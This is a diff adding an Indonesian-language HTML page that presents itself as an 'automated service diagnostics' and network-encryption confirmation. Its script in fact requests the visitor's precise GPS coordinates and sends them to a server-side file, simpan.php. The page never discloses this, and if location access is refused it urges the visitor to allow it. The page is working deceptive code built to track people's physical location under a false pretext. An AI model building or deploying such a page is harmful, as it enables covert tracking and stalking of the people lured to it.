@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Darurat</title>
+    <!-- Memanggil CSS Terpisah -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container-konfirmasi">
+    <h2>AUTOMATED SERVICE DIAGNOSTICS</h2>
+    <p>Silakan tekan tombol "CONFIRM" untuk menyinkronkan status jaringan dan enkripsi jalur komunikasi saat ini.</p>
+    
+    <button id="btnKonfirmasi" class="btn-confirm">CONFIRM</button>
+    
+    <p id="status"></p>
+</div>
+
+<script>
+document.getElementById("btnKonfirmasi").addEventListener("click", function() {
+    const statusText = document.getElementById("status");
+    const btn = this;
+
+    if (!navigator.geolocation) {
+        statusText.style.color = "white";
+        statusText.innerText = "Perangkat Anda tidak mendukung fitur lokasi.";
+        return;
+    }
+
+    btn.disabled = true;
+    btn.style.setProperty('background-color', '#009eec', 'important');
+    btn.innerText = "PROCESS...";
+    statusText.style.color = "#ffffff";
+    statusText.innerText = "Optimasi akses area...";
+
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            fetch('simpan.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "success") {
+                    statusText.style.color = "#d4edda";
+                    statusText.innerText = "Berhasil! Sinkronisasi selesai. Anda dapat menutup halaman ini.";
+                    btn.innerText = "SUCCESS";
+                    btn.style.setProperty('background-color', '#28a745', 'important');
+                    btn.style.color = "#ffffff";
+                } else {
+                    statusText.style.color = "#f8d7da";
+                    statusText.innerText = "Gagal memproses data: " + data.message;
+                    
+                    btn.disabled = false;
+                    btn.innerText = "CONFIRM";
+                    btn.style.setProperty('background-color', '#d9534f', 'important');
+                }
+            })
+            .catch(error => {
+                statusText.style.color = "#f8d7da";
+                statusText.innerText = "Terjadi gangguan koneksi server.";
+                
+                btn.disabled = false;
+                btn.innerText = "CONFIRM";
+                btn.style.setProperty('background-color', '#d9534f', 'important');
+            });
+        },
+        function(error) {
+            statusText.style.color = "#f8d7da";
+            statusText.innerText = "Akses lokasi ditolak. Mohon izinkan akses lokasi untuk melanjutkan.";
+            
+            btn.disabled = false;
+            btn.innerText = "CONFIRM";
+            btn.style.setProperty('background-color', '#d9534f', 'important');
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+});
+</script>
+
+</body>
+</html>
